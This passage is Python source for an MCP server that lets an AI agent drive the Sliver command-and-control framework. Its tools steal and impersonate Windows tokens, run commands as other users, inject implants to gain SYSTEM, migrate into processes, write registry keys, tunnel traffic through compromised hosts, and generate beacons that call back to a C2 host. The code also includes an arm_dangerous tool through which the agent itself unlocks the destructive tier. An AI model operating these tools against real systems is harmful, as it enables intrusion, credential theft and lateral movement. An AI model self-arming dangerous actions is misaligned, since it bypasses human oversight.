        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.make_token(username, password, domain),
            kind, target_id, f"make_token {domain}\\{username}")
        if pending is not None:
            return pending
        return ok("token created", target_kind=kind,
                  username=username, domain=domain)

    @tool(tier="yellow")
    async def impersonate(target_id: str, username: str) -> dict:
        """Steal a running user's token by username. yellow-tier (Windows only).

        The user must have an active process on the host. Use ps() to enumerate.
        Call revert_to_self() when the impersonation context is no longer needed.
        """
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.impersonate(username),
            kind, target_id, f"impersonate {username}")
        if pending is not None:
            return pending
        return ok(f"impersonating {username}", target_kind=kind,
                  username=username, output=res.Output)

    @tool(tier="yellow")
    async def revert_to_self(target_id: str) -> dict:
        """Drop impersonation and return to the original implant token. yellow-tier."""
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.revert_to_self(),
            kind, target_id, "revert_to_self")
        if pending is not None:
            return pending
        return ok("reverted to self", target_kind=kind)

    @tool(tier="yellow")
    async def run_as(
        target_id: str, username: str, process_name: str, args: str = ""
    ) -> dict:
        """Run a command as another user on the implant host. yellow-tier (Windows only).

        Call make_token() first to create the user context, then run_as().
        """
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.run_as(username, process_name, args),
            kind, target_id, f"run_as {username}")
        if pending is not None:
            return pending
        return ok(target_kind=kind, username=username,
                  process_name=process_name, output=res.Output)

    @tool(tier="red", armed=True)
    async def get_system(
        target_id: str,
        c2_host: str,
        hosting_process: str = "spoolsv.exe",
        c2_port: int = 443,
        protocol: str = "https",
        target_os: str = "windows",
        target_arch: str = "amd64",
    ) -> dict:
        """Attempt SYSTEM elevation by injecting an implant into a SYSTEM process.
        RED-tier — requires arm_dangerous() first. Windows only.

        ``c2_host`` must be the current session's C2 host (from session_info active_c2).
        The new SYSTEM implant uses the same C2 profile as the current session.
        """
        cfg, _ = build_implant_config(
            is_beacon=False, os=target_os, arch=target_arch,
            protocol=protocol, c2_host=c2_host, c2_port=c2_port,
        )
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.get_system(hosting_process, cfg),
            kind, target_id, "get_system")
        if pending is not None:
            return pending
        return ok("get_system completed", target_kind=kind,
                  hosting_process=hosting_process)

    # ======================================================================
    # Process migration
    # ======================================================================
    @tool(tier="yellow")
    async def migrate(
        target_id: str,
        pid: int,
        c2_host: str,
        c2_port: int = 443,
        protocol: str = "https",
        target_os: str = "windows",
        target_arch: str = "amd64",
    ) -> dict:
        """Migrate the implant into another process by PID. yellow-tier.

        Injects a new session into the target PID. Use ps() to identify a stable,
        long-running process. ``c2_host`` must match the current session's C2 host.
        """
        cfg, _ = build_implant_config(
            is_beacon=False, os=target_os, arch=target_arch,
            protocol=protocol, c2_host=c2_host, c2_port=c2_port,
        )
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.migrate(pid, cfg),
            kind, target_id, f"migrate pid={pid}")
        if pending is not None:
            return pending
        return ok("migration initiated", target_kind=kind,
                  pid=pid, success=res.Success)

    # ======================================================================
    # Registry (Windows only)
    # ======================================================================
    @tool(tier="green")
    async def registry_read(
        target_id: str,
        hive: str,
        path: str,
        key: str,
        hostname: str = "",
    ) -> dict:
        """Read a registry key value from the implant host. green-tier (Windows only).

        Common hives: HKCU, HKLM, HKCC, HKU, HKCR.
        Example: hive=HKLM path=SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion key=ProductName
        """
        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.registry_read(hive, path, key, hostname),
            kind, target_id, f"registry_read {hive}\\{path}\\{key}")
        if pending is not None:
            return pending
        return ok(target_kind=kind, hive=hive, path=path, key=key, value=res.Value)

    @tool(tier="yellow")
    async def registry_write(
        target_id: str,
        hive: str,
        path: str,
        key: str,
        value: str,
        value_type: str = "String",
        hostname: str = "",
    ) -> dict:
        """Write a registry key value on the implant host. yellow-tier (Windows only).

        ``value_type``: String (default), DWORD, QWORD, Binary.
        ``value`` is always a string; numeric types are auto-converted.
        """
        # RegistryType enum values: Unknown=0, Binary=1, String=2, DWORD=3, QWORD=4
        type_map = {"string": 2, "dword": 3, "qword": 4, "binary": 1}
        reg_type = type_map.get(value_type.lower())
        if reg_type is None:
            return err(f"unknown value_type '{value_type}'; use String, DWORD, QWORD, or Binary")

        string_val = value if value_type.lower() == "string" else ""
        dword_val = int(value) if value_type.lower() == "dword" else 0
        qword_val = int(value) if value_type.lower() == "qword" else 0

        interactive, kind = await mgr.interact(target_id)
        if interactive is None:
            return err(f"no session or beacon with id {target_id}")
        res, pending = await _resolve_exec(
            await interactive.registry_write(
                hive, path, key, hostname,
                string_val, b"", dword_val, qword_val, reg_type),
            kind, target_id, f"registry_write {hive}\\{path}\\{key}")
        if pending is not None:
            return pending
        return ok("registry key written", target_kind=kind,
                  hive=hive, path=path, key=key, value=value, value_type=value_type)

    # ======================================================================
    # Pivots (listing only — see README on the sliver-py tunnel limitation)
    # ======================================================================
    @tool(tier="passive")
    async def list_pivots(session_id: str) -> dict:
        """List pivot listeners running on a session."""
        s = await mgr.client.session_by_id(session_id)
        if s is None:
            return err(f"no session with id {session_id}")
        interactive = await mgr.client.interact_session(session_id)
        pivots = await _maybe_await(await interactive.pivot_listeners())
        return ok(pivots=[serialize_pivot_listener(p) for p in pivots],
                  count=len(pivots))

    # ======================================================================
    # Tunnels — SOCKS5 proxy and static port-forward via gRPC streaming
    # ======================================================================
    @tool(tier="green")
    async def list_tunnels() -> dict:
        """List active SOCKS5 proxies and port-forwards started by this MCP."""
        info = mgr.list_tunnels()
        return ok(
            socks_proxies=info["socks"],
            portfwds=info["portfwd"],
            socks_count=len(info["socks"]),
            portfwd_count=len(info["portfwd"]),
        )

    @tool(tier="yellow")
    async def start_socks(session_id: str, local_port: int = 1080) -> dict:
        """Start a SOCKS5 proxy on local_port routed through a Sliver session.

        Once started, point proxychains / curl --socks5 / Impacket at
        127.0.0.1:<local_port>.  The Sliver server handles SOCKS5 negotiation;
        the client just pipes raw bytes.
        session_id: active session ID (not beacon — sessions only)
        local_port: TCP port to bind on localhost (default 1080)
        """
        if local_port < 1 or local_port > 65535:
            return err("local_port must be 1–65535")
        try:
            port = await mgr.start_socks(session_id, local_port)
        except ValueError as exc:
            return err(str(exc))
        return ok(f"SOCKS5 proxy started on 127.0.0.1:{port}",
                  session_id=session_id, local_port=port,
                  proxychains=f"socks5 127.0.0.1 {port}")

    @tool(tier="yellow")
    async def stop_socks(local_port: int) -> dict:
        """Stop an active SOCKS5 proxy on local_port."""
        stopped = await mgr.stop_socks(local_port)
        if not stopped:
            return err(f"no SOCKS5 proxy found on port {local_port}")
        return ok(f"SOCKS5 proxy on port {local_port} stopped", local_port=local_port)

    @tool(tier="yellow")
    async def start_portfwd(session_id: str, local_port: int,
                             remote_host: str, remote_port: int) -> dict:
        """Forward local_port → remote_host:remote_port via a Sliver session.

        The implant makes the TCP connection to remote_host:remote_port; data
        flows through the TunnelData gRPC stream back to local_port.
        session_id: active session ID (not beacon)
        local_port: TCP port to bind on localhost
        remote_host: target host the implant should connect to
        remote_port: target port
        """
        if local_port < 1 or local_port > 65535:
            return err("local_port must be 1–65535")
        if remote_port < 1 or remote_port > 65535:
            return err("remote_port must be 1–65535")
        try:
            port = await mgr.start_portfwd(session_id, local_port,
                                            remote_host, remote_port)
        except ValueError as exc:
            return err(str(exc))
        return ok(f"portfwd started: 127.0.0.1:{port} → {remote_host}:{remote_port}",
                  session_id=session_id, local_port=port,
                  remote_host=remote_host, remote_port=remote_port)

    @tool(tier="yellow")
    async def stop_portfwd(local_port: int) -> dict:
        """Stop an active port-forward on local_port."""
        stopped = await mgr.stop_portfwd(local_port)
        if not stopped:
            return err(f"no portfwd found on port {local_port}")
        return ok(f"portfwd on port {local_port} stopped", local_port=local_port)

    # ======================================================================
    # Handoff
    # ======================================================================
    @tool(tier="passive")
    async def export_handoff() -> dict:
        """Export structured C2 state (sessions, beacons, listeners, builds).

        Mirrors p0rtix's export_handoff so the agent can feed C2 state back into
        internal-dispatch.
        """
        return await handoff.build_export(mgr.client, mgr.safety.snapshot(),
                                          mgr.operator)

    @tool(tier="green")
    async def ingest_handoff(handoff_data: dict) -> dict:
        """Stand up a listener + beacon from a p0rtix/msf-style handoff.

        Accepts loose keys (redirector/callback_domain/domain/lhost/host/hosts,
        protocol, port, os, arch) and creates a matching listener, then generates
        a matching beacon. Honors the current noise ceiling.
        """
        plan = handoff.normalize_ingest(handoff_data)
        proto = plan["protocol"]

        # 1) listener
        if proto == "https":
            lport = plan["port"] or 443
            await mgr.client.start_https_listener(
                host="0.0.0.0", port=lport, domain=plan["host"])
        elif proto == "http":
            lport = plan["port"] or 80
            await mgr.client.start_http_listener(
                host="0.0.0.0", port=lport, domain=plan["host"])
        elif proto == "mtls":
            lport = plan["port"] or 8888
            await mgr.client.start_mtls_listener(host="0.0.0.0", port=lport)
        elif proto == "dns":
            lport = plan["port"] or 53
            await mgr.client.start_dns_listener(domains=plan["domains"])
        else:
            return err(f"ingest does not support protocol '{proto}' yet")
        job_id = await _resolve_job_id(lport, proto)

        # 2) matching beacon
        cfg, url = build_implant_config(
            is_beacon=True, os=plan["os"], arch=plan["arch"], protocol=proto,
            c2_host=plan["host"], c2_port=plan["port"],
        )
        gen = await mgr.generate_implant(cfg)
        name = gen.File.Name or "beacon"
        out_path = payload_dir() / name
        out_path.write_bytes(gen.File.Data)
        return ok(
            "listener + beacon created from handoff",
            listener={"job_id": job_id, "protocol": proto},
            beacon={"name": name, "saved_path": str(out_path),
                    "size": len(gen.File.Data), "c2": url},
            plan=plan,
        )

    # ======================================================================
    # Safety controls
    # ======================================================================
    @tool(tier="passive", requires_client=False)
    async def set_noise(level: str) -> dict:
        """Set the noise ceiling: passive|green|yellow|red. RED needs arming."""
        success, detail = mgr.safety.set_noise(level)
        if not success:
            return err(detail, **mgr.safety.snapshot())
        return ok(f"noise ceiling set to {detail}", **mgr.safety.snapshot())

    @tool(tier="passive", requires_client=False)
    async def arm_dangerous() -> dict:
        """Unlock RED-tier destructive tools (rm) and raise the ceiling to red."""
        mgr.safety.arm()
        return ok("red unlocked", **mgr.safety.snapshot())

    return server


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def _parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="sliver-mcp",
        description="MCP server for the Sliver C2 framework (authorized use only).",
    )
    p.add_argument("--config", default=None,
                   help="Path to the Sliver operator config (.cfg). Overrides "
                        "$SLIVER_CONFIG. May also be supplied at runtime via connect().")
    p.add_argument("--version", action="version", version=f"sliver-mcp {__version__}")
    return p.parse_args(argv)


def main(argv: list[str] | None = None) -> None:
    ns = _parse_args(sys.argv[1:] if argv is None else argv)
    config_path = ns.config or os.environ.get("SLIVER_CONFIG")
    manager = SliverManager(config_path)
    build_server(manager).run()  # stdio transport (default)


if __name__ == "__main__":
    main()
